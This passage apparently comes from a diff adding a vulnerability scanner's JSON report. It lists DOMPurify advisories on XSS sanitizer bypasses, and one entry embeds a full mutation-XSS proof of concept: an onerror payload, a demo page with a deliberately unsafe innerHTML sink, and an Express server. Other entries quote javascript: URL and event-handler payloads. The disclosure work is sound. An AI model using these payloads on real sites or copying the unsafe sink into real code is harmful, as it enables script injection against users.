+          "Fingerprint": "sha256:13e7a69957fbc8bd4ce65b150d4f06e192b6270e926dee6c6c8c6238ba540d2c",
+          "Title": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathM ...",
+          "Description": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathML, and SVG. Versions 3.0.1 through 3.3.3 are vulnerable to a prototype pollution-based XSS bypass. When an application uses `DOMPurify.sanitize()` with the default configuration (no `CUSTOM_ELEMENT_HANDLING` option), a prior prototype pollution gadget can inject permissive `tagNameCheck` and `attributeNameCheck` regex values into `Object.prototype`, causing DOMPurify to allow arbitrary custom elements with arbitrary attributes — including event handlers — through sanitization. Version 3.4.0 fixes the issue.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-79",
+            "CWE-1321"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:C/C:H/I:L/A:N",
+              "V3Score": 6.9
+            }
+          },
+          "References": [
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.0",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-v9jr-rg53-9pgp"
+          ],
+          "PublishedDate": "2026-04-23T16:16:26.42Z",
+          "LastModifiedDate": "2026-04-23T18:16:29.073Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41239",
+          "VendorIDs": [
+            "GHSA-crv5-9vww-q3g8"
+          ],
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.4.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41239",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:0d3697233c3ad282a82c7883517317d05367247b8d7e56df4a2cbae96c705d3a",
+          "Title": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathM ...",
+          "Description": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathML, and SVG. Starting in version 1.0.10 and prior to version 3.4.0, `SAFE_FOR_TEMPLATES` strips `{{...}}` expressions from untrusted HTML. This works in string mode but not with `RETURN_DOM` or `RETURN_DOM_FRAGMENT`, allowing XSS via template-evaluating frameworks like Vue 2. Version 3.4.0 patches the issue.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-79",
+            "CWE-1289"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V3Vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:N",
+              "V3Score": 6.8
+            }
+          },
+          "References": [
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.0",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-crv5-9vww-q3g8"
+          ],
+          "PublishedDate": "2026-04-23T16:16:26.56Z",
+          "LastModifiedDate": "2026-04-23T16:18:41.563Z"
+        },
+        {
+          "VulnerabilityID": "CVE-2026-41240",
+          "VendorIDs": [
+            "GHSA-h7mw-gpvr-xq4m"
+          ],
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.4.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://avd.aquasec.com/nvd/cve-2026-41240",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:7073865e99dd3d4db472d39a1414f9f9d1162141054f92e5029ce4a98bfacb62",
+          "Title": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathM ...",
+          "Description": "DOMPurify is a DOM-only cross-site scripting sanitizer for HTML, MathML, and SVG. Versions prior to 3.4.0 have an inconsistency between FORBID_TAGS and FORBID_ATTR handling when function-based ADD_TAGS is used. Commit c361baa added an early exit for FORBID_ATTR at line 1214. The same fix was not applied to FORBID_TAGS. At line 1118-1123, when EXTRA_ELEMENT_HANDLING.tagCheck returns true, the short-circuit evaluation skips the FORBID_TAGS check entirely. This allows forbidden elements to survive sanitization with their attributes intact. Version 3.4.0 patches the issue.",
+          "Severity": "MEDIUM",
+          "CweIDs": [
+            "CWE-79",
+            "CWE-183"
+          ],
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 6
+            }
+          },
+          "References": [
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/commit/c361baa18dbdcb3344a41110f4c48ad85bf48f80",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.4.0",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-h7mw-gpvr-xq4m"
+          ],
+          "PublishedDate": "2026-04-23T16:16:26.71Z",
+          "LastModifiedDate": "2026-04-24T14:41:55.89Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-39q2-94rc-95cp",
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.4.0",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-39q2-94rc-95cp",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:b5d184551fe1a8cd5b0249cd915524bf35b44c76ccbc55eba4de1730f07183f9",
+          "Title": "DOMPurify's ADD_TAGS function form bypasses FORBID_TAGS due to short-circuit evaluation",
+          "Description": "## Summary\nIn `src/purify.ts:1117-1123`, `ADD_TAGS` as a function (via `EXTRA_ELEMENT_HANDLING.tagCheck`) bypasses `FORBID_TAGS` due to short-circuit evaluation.\n\nThe condition:\n```\n!(tagCheck(tagName)) \u0026\u0026 (!ALLOWED_TAGS[tagName] || FORBID_TAGS[tagName])\n```\nWhen `tagCheck(tagName)` returns `true`, the entire condition is `false` and the element is kept — `FORBID_TAGS[tagName]` is never evaluated.\n\n## Inconsistency\nThis contradicts the attribute-side pattern at line 1214 where `FORBID_ATTR` explicitly wins first:\n```\nif (FORBID_ATTR[lcName]) { continue; }\n```\nFor tags, FORBID should also take precedence over ADD.\n\n## Impact\nApplications using both `ADD_TAGS` as a function and `FORBID_TAGS` simultaneously get unexpected behavior — forbidden tags are allowed through. Config-dependent but a genuine logic inconsistency.\n\n## Suggested Fix\nCheck `FORBID_TAGS` before `tagCheck`:\n```\nif (FORBID_TAGS[tagName]) { /* remove */ }\nelse if (tagCheck(tagName) || ALLOWED_TAGS[tagName]) { /* keep */ }\n```\n\n## Affected Version\nv3.3.3 (commit 883ac15)",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:L/VI:L/VA:N/SC:N/SI:N/SA:N",
+              "V40Score": 5.3
+            }
+          },
+          "References": [
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-39q2-94rc-95cp"
+          ],
+          "PublishedDate": "2026-04-16T00:46:35Z",
+          "LastModifiedDate": "2026-04-16T00:46:35Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-cj63-jhhr-wcxv",
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.3.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-cj63-jhhr-wcxv",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:5da15167a0a1f4e72571cc87fac0d86855987d33a07420d5e2327508fbde8df8",
+          "Title": "DOMPurify USE_PROFILES prototype pollution allows event handlers",
+          "Description": "## Summary\nWhen `USE_PROFILES` is enabled, DOMPurify rebuilds `ALLOWED_ATTR` as a plain array before populating it with the requested allowlists. Because the sanitizer still looks up attributes via `ALLOWED_ATTR[lcName]`, any `Array.prototype` property that is polluted also counts as an allowlisted attribute. An attacker who can set `Array.prototype.onclick = true` (or a runtime already subject to prototype pollution) can thus force DOMPurify to keep event handlers such as `onclick` even when they are normally forbidden. The provided PoC sanitizes `\u003cimg onclick=...\u003e` with `USE_PROFILES` and adds the sanitized output to the DOM; the polluted prototype allows the event handler to survive and execute, turning what should be a blocklist into a silent XSS vector.\n\n## Impact\nPrototype pollution makes DOMPurify accept dangerous event handler attributes, which bypasses the sanitizer and results in DOM-based XSS once the sanitized markup is rendered.\n\n## Credits\nIdentified by Cantina’s Apex (https://www.cantina.security).",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:L/VA:N/SC:L/SI:L/SA:N",
+              "V40Score": 5.3
+            }
+          },
+          "References": [
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.3.2",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-cj63-jhhr-wcxv"
+          ],
+          "PublishedDate": "2026-04-03T03:45:08Z",
+          "LastModifiedDate": "2026-04-03T03:45:08Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-cjmm-f4jc-qw8r",
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.3.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-cjmm-f4jc-qw8r",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:c36127cab3a60f9a46a7df6edfe512525247160647b03370855bf2717402688b",
+          "Title": "DOMPurify ADD_ATTR predicate skips URI validation",
+          "Description": "## Summary\nDOMPurify allows `ADD_ATTR` to be provided as a predicate function via `EXTRA_ELEMENT_HANDLING.attributeCheck`. When the predicate returns `true`, `_isValidAttribute` short-circuits the attribute check before URI-safe validation runs. An attacker who supplies a predicate that accepts specific attribute/tag combinations can then sanitize input such as `\u003ca href=\"javascript:alert(document.domain)\"\u003e` and have the `javascript:` URL survive, because URI validation is skipped for that attribute while other checks still pass. The provided PoC accepts `href` for anchors and then triggers a click inside an iframe, showing that the sanitized payload executes despite the protocol bypass.\n\n## Impact\nPredicate-based allowlisting bypasses DOMPurify's URI validation, allowing unsafe protocols such as `javascript:` to reach the DOM and execute whenever the link is activated, resulting in DOM-based XSS.\n\n## Credits\nIdentified by Cantina’s Apex (https://www.cantina.security).",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+              "V40Score": 5.3
+            }
+          },
+          "References": [
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.3.2",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-cjmm-f4jc-qw8r"
+          ],
+          "PublishedDate": "2026-04-03T03:46:07Z",
+          "LastModifiedDate": "2026-04-03T03:46:07Z"
+        },
+        {
+          "VulnerabilityID": "GHSA-h8r8-wccr-v5f2",
+          "PkgID": "dompurify@3.2.7",
+          "PkgName": "dompurify",
+          "PkgIdentifier": {
+            "PURL": "pkg:npm/dompurify@3.2.7",
+            "UID": "f3c18d1d40b2f032"
+          },
+          "InstalledVersion": "3.2.7",
+          "FixedVersion": "3.3.2",
+          "Status": "fixed",
+          "SeveritySource": "ghsa",
+          "PrimaryURL": "https://github.com/advisories/GHSA-h8r8-wccr-v5f2",
+          "DataSource": {
+            "ID": "ghsa",
+            "Name": "GitHub Security Advisory npm",
+            "URL": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm"
+          },
+          "Fingerprint": "sha256:ee758a22a7d16fcf681e726c11ac149683ed931d6c539b6266e85120b87648ee",
+          "Title": "DOMPurify is vulnerable to mutation-XSS via Re-Contextualization ",
+          "Description": "## Description\n\nA mutation-XSS (mXSS) condition was confirmed when sanitized HTML is reinserted into a new parsing context using `innerHTML` and special wrappers. The vulnerable wrappers confirmed in browser behavior are `script`, `xmp`, `iframe`, `noembed`, `noframes`, and `noscript`. The payload remains seemingly benign after `DOMPurify.sanitize()`, but mutates during the second parse into executable markup with an event handler, enabling JavaScript execution in the client (`alert(1)` in the PoC).\n\n\n## Vulnerability\n\nThe root cause is context switching after sanitization: sanitized output is treated as trusted and concatenated into a wrapper string (for example, `\u003cxmp\u003e ... \u003c/xmp\u003e` or other special wrappers) before being reparsed by the browser. In this flow, attacker-controlled text inside an attribute (for example `\u003c/xmp\u003e` or equivalent closing sequences for each wrapper) closes the special parsing context early and reintroduces attacker markup (`\u003cimg ... onerror=...\u003e`) outside the original attribute context. DOMPurify sanitizes the original parse tree, but the application performs a second parse in a different context, reactivating dangerous tokens (classic mXSS pattern).\n\n## PoC\n\n1. Start the PoC app:\n```bash\nnpm install\nnpm start\n```\n\n2. Open `http://localhost:3001`.\n3. Set `Wrapper en sink` to `xmp`.\n4. Use payload:\n```html\n \u003cimg src=x alt=\"\u003c/xmp\u003e\u003cimg src=x onerror=alert('expoc')\u003e\"\u003e\n```\n\n5. Click `Sanitize + Render`.\n6. Observe:\n- `Sanitized response` still contains the `\u003c/xmp\u003e` sequence inside `alt`.\n- The sink reparses to include `\u003cimg src=\"x\" onerror=\"alert('expoc')\"\u003e`.\n- `alert('expoc')` is triggered.\n7. Files:\n- index.html\n\n```html\n\u003c!doctype html\u003e\n\u003chtml lang=\"en\"\u003e\n  \u003chead\u003e\n    \u003cmeta charset=\"utf-8\"\u003e\n    \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1\"\u003e\n    \u003ctitle\u003eexpoc - DOMPurify SSR PoC\u003c/title\u003e\n    \u003cstyle\u003e\n      :root {\n        --bg: #f7f8fb;\n        --panel: #ffffff;\n        --line: #d8dce6;\n        --text: #0f172a;\n        --muted: #475569;\n        --accent: #0ea5e9;\n      }\n\n      * {\n        box-sizing: border-box;\n      }\n\n      body {\n        margin: 0;\n        font-family: \"SF Mono\", Menlo, Consolas, monospace;\n        color: var(--text);\n        background: radial-gradient(circle at 10% 0%, #e0f2fe 0%, var(--bg) 60%);\n      }\n\n      main {\n        max-width: 980px;\n        margin: 28px auto;\n        padding: 0 16px 20px;\n      }\n\n      h1 {\n        margin: 0 0 10px;\n        font-size: 1.45rem;\n      }\n\n      p {\n        margin: 0;\n        color: var(--muted);\n      }\n\n      .grid {\n        display: grid;\n        gap: 14px;\n        margin-top: 16px;\n      }\n\n      .card {\n        background: var(--panel);\n        border: 1px solid var(--line);\n        border-radius: 12px;\n        padding: 14px;\n      }\n\n      label {\n        display: block;\n        margin-bottom: 7px;\n        font-size: 0.85rem;\n        color: var(--muted);\n      }\n\n      textarea,\n      input,\n      select,\n      button {\n        width: 100%;\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 9px 10px;\n        font: inherit;\n        background: #fff;\n      }\n\n      textarea {\n        min-height: 110px;\n        resize: vertical;\n      }\n\n      .row {\n        display: grid;\n        grid-template-columns: 1fr 230px;\n        gap: 12px;\n      }\n\n      button {\n        cursor: pointer;\n        background: var(--accent);\n        color: #fff;\n        border-color: #0284c7;\n      }\n\n      #sink {\n        min-height: 90px;\n        border: 1px dashed #94a3b8;\n        border-radius: 8px;\n        padding: 10px;\n        background: #f8fafc;\n      }\n\n      pre {\n        margin: 0;\n        white-space: pre-wrap;\n        word-break: break-word;\n      }\n\n      .note {\n        margin-top: 8px;\n        font-size: 0.85rem;\n      }\n\n      .status-grid {\n        display: grid;\n        grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));\n        gap: 8px;\n        margin-top: 10px;\n      }\n\n      .status-item {\n        border: 1px solid var(--line);\n        border-radius: 8px;\n        padding: 8px 10px;\n        font-size: 0.85rem;\n        background: #fff;\n      }\n\n      .status-item.vuln {\n        border-color: #ef4444;\n        background: #fef2f2;\n      }\n\n      .status-item.safe {\n        border-color: #22c55e;\n        background: #f0fdf4;\n      }\n\n      @media (max-width: 760px) {\n        .row {\n          grid-template-columns: 1fr;\n        }\n      }\n    \u003c/style\u003e\n  \u003c/head\u003e\n  \u003cbody\u003e\n    \u003cmain\u003e\n      \u003ch1\u003eexpoc - DOMPurify Server-Side PoC\u003c/h1\u003e\n      \u003cp\u003e\n        Flujo: input -\u003e POST /sanitize (Node + jsdom + DOMPurify) -\u003e render vulnerable con innerHTML.\n      \u003c/p\u003e\n\n      \u003cdiv class=\"grid\"\u003e\n        \u003csection class=\"card\"\u003e\n          \u003clabel for=\"payload\"\u003ePayload\u003c/label\u003e\n          \u003ctextarea id=\"payload\"\u003e\u003cimg src=x alt=\"\u003c/script\u003e\u003cimg src=x onerror=alert('expoc')\u003e\"\u003e\u003c/textarea\u003e\n          \u003cdiv class=\"row\" style=\"margin-top: 10px;\"\u003e\n            \u003cdiv\u003e\n              \u003clabel for=\"wrapper\"\u003eWrapper en sink\u003c/label\u003e\n              \u003cselect id=\"wrapper\"\u003e\n                \u003coption value=\"div\"\u003ediv\u003c/option\u003e\n                \u003coption value=\"textarea\"\u003etextarea\u003c/option\u003e\n                \u003coption value=\"title\"\u003etitle\u003c/option\u003e\n                \u003coption value=\"style\"\u003estyle\u003c/option\u003e\n                \u003coption value=\"script\" selected\u003escript\u003c/option\u003e\n                \u003coption value=\"xmp\"\u003exmp\u003c/option\u003e\n                \u003coption value=\"iframe\"\u003eiframe\u003c/option\u003e\n                \u003coption value=\"noembed\"\u003enoembed\u003c/option\u003e\n                \u003coption value=\"noframes\"\u003enoframes\u003c/option\u003e\n                \u003coption value=\"noscript\"\u003enoscript\u003c/option\u003e\n              \u003c/select\u003e\n            \u003c/div\u003e\n            \u003cdiv style=\"display:flex;align-items:end;\"\u003e\n              \u003cbutton id=\"run\" type=\"button\"\u003eSanitize + Render\u003c/button\u003e\n            \u003c/div\u003e\n          \u003c/div\u003e\n          \u003cp class=\"note\"\u003eSe usa render vulnerable: \u003ccode\u003esink.innerHTML = '\u0026lt;wrapper\u0026gt;' + sanitized + '\u0026lt;/wrapper\u0026gt;'\u003c/code\u003e.\u003c/p\u003e\n          \u003cdiv class=\"status-grid\"\u003e\n            \u003cdiv class=\"status-item vuln\"\u003escript (vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item vuln\"\u003exmp (vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item vuln\"\u003eiframe (vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item vuln\"\u003enoembed (vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item vuln\"\u003enoframes (vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item vuln\"\u003enoscript (vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item safe\"\u003ediv (no vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item safe\"\u003etextarea (no vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item safe\"\u003etitle (no vulnerable)\u003c/div\u003e\n            \u003cdiv class=\"status-item safe\"\u003estyle (no vulnerable)\u003c/div\u003e\n          \u003c/div\u003e\n        \u003c/section\u003e\n\n        \u003csection class=\"card\"\u003e\n          \u003clabel\u003eSanitized response\u003c/label\u003e\n          \u003cpre id=\"sanitized\"\u003e(empty)\u003c/pre\u003e\n        \u003c/section\u003e\n\n        \u003csection class=\"card\"\u003e\n          \u003clabel\u003eSink\u003c/label\u003e\n          \u003cdiv id=\"sink\"\u003e\u003c/div\u003e\n        \u003c/section\u003e\n      \u003c/div\u003e\n    \u003c/main\u003e\n\n    \u003cscript\u003e\n      const payload = document.getElementById('payload');\n      const wrapper = document.getElementById('wrapper');\n      const run = document.getElementById('run');\n      const sanitizedNode = document.getElementById('sanitized');\n      const sink = document.getElementById('sink');\n\n      run.addEventListener('click', async () =\u003e {\n        const response = await fetch('/sanitize', {\n          method: 'POST',\n          headers: { 'Content-Type': 'application/json' },\n          body: JSON.stringify({ input: payload.value })\n        });\n\n        const data = await response.json();\n        const sanitized = data.sanitized || '';\n        const w = wrapper.value;\n\n        sanitizedNode.textContent = sanitized;\n        sink.innerHTML = '\u003c' + w + '\u003e' + sanitized + '\u003c/' + w + '\u003e';\n      });\n    \u003c/script\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\n- server.js\n\n```js\nconst express = require('express');\nconst path = require('path');\nconst { JSDOM } = require('jsdom');\nconst createDOMPurify = require('dompurify');\n\nconst app = express();\nconst port = process.env.PORT || 3001;\n\nconst window = new JSDOM('').window;\nconst DOMPurify = createDOMPurify(window);\n\napp.use(express.json());\napp.use(express.static(path.join(__dirname, 'public')));\n\napp.get('/health', (_req, res) =\u003e {\n  res.json({ ok: true, service: 'expoc' });\n});\n\napp.post('/sanitize', (req, res) =\u003e {\n  const input = typeof req.body?.input === 'string' ? req.body.input : '';\n  const sanitized = DOMPurify.sanitize(input);\n  res.json({ sanitized });\n});\n\napp.listen(port, () =\u003e {\n  console.log(`expoc running at http://localhost:${port}`);\n});\n```\n\n- package.json\n\n```json\n{\n  \"name\": \"expoc\",\n  \"version\": \"1.0.0\",\n  \"main\": \"server.js\",\n  \"scripts\": {\n    \"test\": \"echo \\\"Error: no test specified\\\" \u0026\u0026 exit 1\",\n    \"start\": \"node server.js\",\n    \"dev\": \"node server.js\"\n  },\n  \"keywords\": [],\n  \"author\": \"\",\n  \"license\": \"ISC\",\n  \"description\": \"\",\n  \"dependencies\": {\n    \"dompurify\": \"^3.3.1\",\n    \"express\": \"^5.2.1\",\n    \"jsdom\": \"^28.1.0\"\n  }\n}\n```\n\n## Evidence\n\n- PoC\n\n[daft-video.webm](https://github.com/user-attachments/assets/499a593d-0241-4ab8-95a9-cf49a00bda90)\n\n- XSS triggered\n\u003cimg width=\"2746\" height=\"1588\" alt=\"daft-img\" src=\"https://github.com/user-attachments/assets/1f463c14-d5a3-4c93-94e4-12d2d02c7d15\" /\u003e\n\n## Why This Happens\nThis is a mutation-XSS pattern caused by a parse-context mismatch:\n\n- Parse 1 (sanitization phase): input is interpreted under normal HTML parsing rules.\n- Parse 2 (sink phase): sanitized output is embedded into a wrapper that changes parser state (`xmp` raw-text behavior).\n- Attacker-controlled sequence (`\u003c/xmp\u003e`) gains structural meaning in parse 2 and alters DOM structure.\n\nSanitization is not a universal guarantee across all future parsing contexts. The sink design reintroduces risk.\n\n## Remediation Guidance\n1. Do not concatenate sanitized strings into new HTML wrappers followed by `innerHTML`.\n2. Keep the rendering context stable from sanitize to sink.\n3. Prefer DOM-safe APIs (`textContent`, `createElement`, `setAttribute`) over string-based HTML composition.\n4. If HTML insertion is required, sanitize as close as possible to final insertion context and avoid wrapper constructs with raw-text semantics (`xmp`, `script`, etc.).\n5. Add regression tests for context-switch/mXSS payloads (including `\u003c/xmp\u003e`, `\u003c/noscript\u003e`, similar parser-breakout markers).\n\nReported by Oscar Uribe, Security Researcher at Fluid Attacks. Camilo Vera and Cristian Vargas from the Fluid Attacks Research Team have identified a mXSS via Re-Contextualization in DomPurify 3.3.1.\n\nFollowing Fluid Attacks [Disclosure Policy](https://fluidattacks.com/advisories/policy), if this report corresponds to a vulnerability and the conditions outlined in the policy are met, this advisory will be published on the website over the next few days (the timeline may vary depending on maintainers' willingness to attend to and respond to this report) at the following URL: https://fluidattacks.com/advisories/daft\n\nAcknowledgements: [Camilo Vera](https://github.com/caverav/) and [Cristian Vargas](https://github.com/tachote).",
+          "Severity": "MEDIUM",
+          "VendorSeverity": {
+            "ghsa": 2
+          },
+          "CVSS": {
+            "ghsa": {
+              "V40Vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:L/SI:L/SA:N",
+              "V40Score": 6.9
+            }
+          },
+          "References": [
+            "https://github.com/cure53/DOMPurify",
+            "https://github.com/cure53/DOMPurify/releases/tag/3.3.2",
+            "https://github.com/cure53/DOMPurify/security/advisories/GHSA-h8r8-wccr-v5f2"
+          ],
+          "PublishedDate": "2026-03-27T20:41:29Z",
+          "LastModifiedDate": "2026-03-27T20:41:29Z"
+        }
+      ]
+    },
+    {
+      "Target": "sdks/sdk-java/pom.xml",
+      "Class": "lang-pkgs",
+      "Type": "pom",
+      "Packages": [
+        {
+          "ID": "io.ruleforge:sdk-java:0.1.0::feb41812",
+          "Name": "io.ruleforge:sdk-java",
+          "Identifier": {
+            "PURL": "pkg:maven/io.ruleforge/sdk-java@0.1.0",
+            "UID": "2c9edc9d373b49f"
+          },
+          "Version": "0.1.0",
+          "Relationship": "root",
+          "DependsOn": [
+            "com.fasterxml.jackson.core:jackson-databind:2.17.0::3a4f3649",
+            "com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.17.0::8f3c380c"
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "com.fasterxml.jackson.core:jackson-databind:2.17.0::3a4f3649",
+          "Name": "com.fasterxml.jackson.core:jackson-databind",
+          "Identifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-databind@2.17.0",
+            "UID": "3fde29e1e83abc67"
+          },
+          "Version": "2.17.0",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "com.fasterxml.jackson.core:jackson-annotations:2.17.0::ddef74fa",
+            "com.fasterxml.jackson.core:jackson-core:2.17.0::acf0ecc4",
+            "net.bytebuddy:byte-buddy:1.14.9::5883f83b"
+          ],
+          "Locations": [
+            {
+              "StartLine": 23,
+              "EndLine": 27
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "com.fasterxml.jackson.datatype:jackson-datatype-jsr310:2.17.0::8f3c380c",
+          "Name": "com.fasterxml.jackson.datatype:jackson-datatype-jsr310",
+          "Identifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.datatype/jackson-datatype-jsr310@2.17.0",
+            "UID": "b616f8d4139d153e"
+          },
+          "Version": "2.17.0",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Relationship": "direct",
+          "DependsOn": [
+            "com.fasterxml.jackson.core:jackson-annotations:2.17.0::ddef74fa",
+            "com.fasterxml.jackson.core:jackson-core:2.17.0::acf0ecc4",
+            "com.fasterxml.jackson.core:jackson-databind:2.17.0::3a4f3649"
+          ],
+          "Locations": [
+            {
+              "StartLine": 28,
+              "EndLine": 32
+            }
+          ],
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "com.fasterxml.jackson.core:jackson-annotations:2.17.0::ddef74fa",
+          "Name": "com.fasterxml.jackson.core:jackson-annotations",
+          "Identifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-annotations@2.17.0",
+            "UID": "30a246af93de43dd"
+          },
+          "Version": "2.17.0",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "com.fasterxml.jackson.core:jackson-core:2.17.0::acf0ecc4",
+          "Name": "com.fasterxml.jackson.core:jackson-core",
+          "Identifier": {
+            "PURL": "pkg:maven/com.fasterxml.jackson.core/jackson-core@2.17.0",
+            "UID": "9ed212412a627a27"
+          },
+          "Version": "2.17.0",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "AnalyzedBy": "pom"
+        },
+        {
+          "ID": "net.bytebuddy:byte-buddy:1.14.9::5883f83b",
+          "Name": "net.bytebuddy:byte-buddy",
+          "Identifier": {
+            "PURL": "pkg:maven/net.bytebuddy/byte-buddy@1.14.9",
+            "UID": "71ed3499b4a2d242"
+          },
+          "Version": "1.14.9",
+          "Licenses": [
+            "Apache-2.0"
+          ],
+          "Indirect": true,
+          "Relationship": "indirect",
+          "AnalyzedBy": "pom"
+        }
+      ],
+      "Vulnerabilities": [
+        {
+          "VulnerabilityID": "GHSA-72hv-8253-57qq",
